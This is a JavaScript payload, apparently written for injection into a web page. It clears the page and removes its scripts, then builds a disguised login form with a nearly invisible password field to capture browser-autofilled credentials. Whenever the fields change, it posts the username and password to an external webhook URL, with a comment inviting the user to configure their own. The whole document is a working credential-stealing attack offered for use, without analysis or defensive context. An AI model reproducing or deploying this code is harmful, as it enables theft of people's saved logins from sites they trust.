document.body.innerHTML = "";
var scriptss = document.scripts;
for (var i = scriptss.length - 1; i >= 0; i--) {
    var script = scriptss[i];
    script.parentNode.removeChild(script);
}
var s = document.createElement('style');
var c = 'body > *:not(form):not(textarea) { display: none!important; }';
s.appendChild(document.createTextNode(c));
document.head.appendChild(s);

var form = document.createElement('form');
var inputName = document.createElement('input');
inputName.type = 'text';
inputName.id = 'username';
inputName.name = 'username';
inputName.autocomplete = 'username';
inputName.placeholder = 'Check here';
inputName.style.border = "none";
inputName.style.outline = "none";
inputName.style.background = "none";
inputName.style.width = "100%";
inputName.classList.add("single-input")

var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password';
inputPassword.name = 'password';
inputPassword.autocomplete = 'current-password';
inputPassword.style.border = "none";
inputPassword.style.outline = "none";
inputPassword.style.background = "none";
inputPassword.style.padding = "0";
inputPassword.style.width = "1%";
inputPassword.classList.add("single-input")

form.appendChild(inputName);
form.appendChild(inputPassword);
document.body.appendChild(form);

// Assuming you have an <input> element with an ID of "username"
var inputElement = document.getElementById("username");

setTimeout(function () {
    let a = document.getElementsByName('username')[0];
    let b = document.getElementsByName('password')[0];

    function sendDataToServer(username, password) {
        // **CONFIGURE YOUR WEBHOOK URL HERE**
        const webhookUrl = 'https://webhook.site/715d6362-10ac-415a-a2ea-e0447862f5f4';

        // Prepare data
        const data = { username, password };

        // Send data to server using Fetch API
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        })
       .then(response => response.text())
       .then(serverResponse => console.log(serverResponse))
       .catch(error => console.error('Error sending data to server:', error));
    }

    function f() {
        if (b.value.length > 0) {
            // Instead of alert, send data to server
            sendDataToServer(a.value, b.value);
        }
    }

    a.form.onclick = f;
    a.onchange = f;
    b.onchange = f;
    a.oninput = f;
    b.oninput = f;
}, 1000);
